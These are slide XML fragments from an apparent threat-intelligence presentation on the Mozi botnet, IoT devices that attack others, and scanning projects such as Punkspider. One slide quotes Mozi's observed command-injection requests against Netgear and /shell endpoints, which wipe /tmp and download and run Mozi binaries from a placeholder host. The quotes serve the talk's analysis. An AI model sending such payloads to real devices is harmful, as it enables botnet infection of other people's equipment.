                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28D90DE5-AF57-CE45-AA8C-5A0741147B2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472974"/>
            <a:ext cx="12192000" cy="5385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945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96;p15" descr="Diagram&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BD18486-134D-FB42-BAB1-B98B3CD7630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 l="18320" r="13982"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3028208" y="489857"/>
            <a:ext cx="6590805" cy="58782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0525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01;p18" descr="Diagram&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B98886FB-FE80-6947-8E10-1A42BAE5F14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17987"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="999902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3270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7;p1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406E649-0A8C-724B-9D74-2F4B97C97951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91887" y="0"/>
            <a:ext cx="1333251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;p2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D36FB96-3F11-B647-AC6A-26EF4ECC84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1950" y="514950"/>
            <a:ext cx="1147625" cy="182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4187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2;p1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A1320C5-7F2F-5C46-9C43-44C633E7CD0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0627"/>
            <a:ext cx="11822546" cy="6650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;p2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CB520892-0BF1-454A-A81F-200F9380C1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1950" y="514950"/>
            <a:ext cx="1147625" cy="182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5932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7;p1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D39B77A-8386-BF45-B8BC-ACDDC3C0440F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966" y="130627"/>
            <a:ext cx="11876832" cy="6680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;p2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{25BAB070-7F9C-074C-96C1-D04011D03F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1950" y="514950"/>
            <a:ext cx="1147625" cy="182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585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Some of the underlying IOStation tech</a:t>
            </a:r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body" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1825625"/>
            <a:ext cx="9636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Running a datacenter can be a lot of work, but also can have a great cost ratio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 err="1"/>
              <a:t>Postgresql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is great, except when it fails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RabbitMQ sounds great, but then you try to use it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Kafka can also be a bit brutal, but much better overall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Bash is awesome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Python all the things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29;p21" descr="Graphical user interface&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6D31E9E-BAEF-2C4E-8F85-381B9D348F1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8323" y="-41988"/>
            <a:ext cx="11126231" cy="6899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;p2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2FA62D0-80A8-A946-994B-285E782C84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1950" y="514950"/>
            <a:ext cx="1147625" cy="182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263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18D0C-C1A6-D245-B011-A1FFCA81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Mozi botnet</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;235;p23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA89A4C2-6E1C-324E-A30C-00EF97C1DF9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710266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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Attempts a command injection on webservers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Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Commands executed: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Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>setup.cgi?next_file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>netgear.cfg&amp;todo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>syscmd&amp;cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>=rm+-rf+/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/*;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>wget+http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>://&lt;IP&gt;:&lt;port&gt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mozi.m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>+-O+/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>netgear;sh+netgear&amp;curpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>=/&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>currentsetting.htm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>=1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600"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>shell?cd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>+/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tmp;rm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>+-rf+*;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>wget+http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>://&lt;IP&gt;:&lt;port&gt;/Mozi.a;chmod+777+Mozi.a;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mozi.a+jaws</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800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itchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Looks like it may be looking for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>netgear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> equipment, but we know from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Punkspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> that there are many webservers vulnerable to remote command injection.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079BE38-21D9-6143-83E2-7F64D8BA9A8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8263759" y="2070538"/>
            <a:ext cx="3090041" cy="30900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Robot with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6457D0D8-7025-C749-B377-9DC2EAC35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21070" y="2427849"/>
            <a:ext cx="2375417" cy="237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03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46;p24" descr="Map&#10;&#10;Description automatically generated with medium confidence">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACB8551B-2957-504B-8369-5FB12EBC104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2" b="15905"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3383280"/>
            <a:ext cx="7555037" cy="338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47;p24" descr="Map&#10;&#10;Description automatically generated with medium confidence">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5865584E-DA5B-D749-8B3F-6AAA581666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-2" b="15877"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="7552944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45;p24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE576E80-27B7-4444-AB33-5E81CA7F9196}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8073053" y="2689222"/>
            <a:ext cx="3403600" cy="3272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12738" indent="-312738">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Top image: Where the attacks are coming from</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="312738" indent="-312738">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="312738" indent="-312738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itchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Bottom image: Where the malware is being hosted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8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45;p24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE576E80-27B7-4444-AB33-5E81CA7F9196}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8185019" y="2763866"/>
            <a:ext cx="3403600" cy="3272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12738" indent="-312738">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Where the attacks are going</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="312738" indent="-312738">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="312738" indent="-312738">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>One country is suspiciously missing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Google Shape;260;p25" descr="Map&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72E56F12-1197-784A-8994-6C63B84A03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458881" y="1432924"/>
            <a:ext cx="8207919" cy="43707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0481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7AE48-050C-EE4E-B0F9-00D37B3F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devices are doing the attacks?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;268;p26">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58F59296-5D85-7343-A8A8-22362B15CAC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90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0"/>
              <a:t>Most vendors seem to be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>D-Link</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Netgear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chemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Huawei</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0"/>
              <a:t>Devices are primarily home internet, DVRs, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>IPCameras</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>, some GPON devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>a:goahead:goahead_webserver</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/h:zebra:zte_f660</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/a:lighttpd:lighttpd:1.4.39 (has 29 CVEs, many at 7.5 severity)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/a:boa:boa:0.93.15</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/h:fortinet:fortiwifi:80c</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="744537" lvl="2" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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400" dirty="0" err="1"/>
              <a:t>cpe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>:/h:huawei:hg8240</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-6413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8538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94DE-ABFC-8F4E-8563-20A7AE6B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Here’s an example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;278;p27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A77CEF0-D09A-4840-92E8-A788DDD29E06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1460791"/>
            <a:ext cx="10434000" cy="100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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800"/>
              <a:t>cpe:/a:goahead:goahead_webserver</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800"/>
              <a:t>Looks a lot like a D-Link interface</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800"/>
              <a:t>Very little code, but a javascript import shows some new links</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Google Shape;279;p27" descr="Text, letter&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64DBCF53-E813-A849-8CF8-FAC6500A7AC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35170" y="2781121"/>
            <a:ext cx="4135150" cy="3483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80;p2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07C4124-7659-434F-BD6A-34EE9BEE17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08" y="3199041"/>
            <a:ext cx="5523082" cy="2692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222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94DE-ABFC-8F4E-8563-20A7AE6B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not needed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;278;p27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A77CEF0-D09A-4840-92E8-A788DDD29E06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="879000" y="1460791"/>
            <a:ext cx="104340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90000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Can view settings and change configuration without login</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Google Shape;291;p28" descr="Text&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1FB9BDA-10A1-C64E-9F59-3349C9D7532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7500" y="2617430"/>
            <a:ext cx="3109348" cy="3483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92;p28" descr="Graphical user interface&#10;&#10;Description automatically generated">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F00E51C5-DEA2-584F-A731-E0C2EDBD93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2781" y="2617430"/>
            <a:ext cx="5422356" cy="34838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1732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4100-69AB-C944-A8A0-CF30E88A5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Where’s this all going?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Google Shape;300;p32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9875B84D-C5BF-2D45-817A-0606CCB8094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200" dirty="0" err="1"/>
              <a:t>Punkspider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="9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200" dirty="0"/>
              <a:t>We’ve created a hugely scalable system for fuzzing a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>fuckton</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> of URLs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="9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200" dirty="0"/>
              <a:t>We’ve found vulns in major websites (even found a 0-day in forum tech)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="9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200" dirty="0"/>
              <a:t>We can keep results updated while still going extremely broad</a:t>
            </a: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200" dirty="0" err="1"/>
              <a:t>IOStation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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200" dirty="0"/>
              <a:t>Continue developing tools for scoring corporate risk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="4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200" dirty="0"/>
              <a:t>Industrial control systems (especially when related to critical infrastructure)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Early identification of attacker infrastructure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SzPts val="24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142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>
            <a:off x="916100" y="1200325"/>
            <a:ext cx="5862600" cy="4457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21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect l="26019"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="916100" y="1200325"/>
            <a:ext cx="5862600" cy="445739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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="915925" y="1200325"/>
            <a:ext cx="5862600" cy="4457400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00205B">
              <a:alpha val="659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6795910" y="1200318"/>
            <a:ext cx="4130400" cy="44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7371096" y="1708657"/>
            <a:ext cx="177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Contact Us</a:t>
            </a:r>
            <a:endParaRPr sz="1400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264" name="Google Shape;264;p21" descr="Mark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71096" y="2757553"/>
            <a:ext cx="531057" cy="53105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8100079" y="2609570"/>
            <a:ext cx="2566500" cy="8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2F2F2"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>1775 Tysons Blvd, Suite 800</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="F2F2F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2F2F2"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>Tysons, VA 22102</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="F2F2F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F2F2F2"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>United States</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:srgbClr val="F2F2F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7" name="Google Shape;267;p21" descr="Emai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14846" y="3738538"/>
            <a:ext cx="443559" cy="44355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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
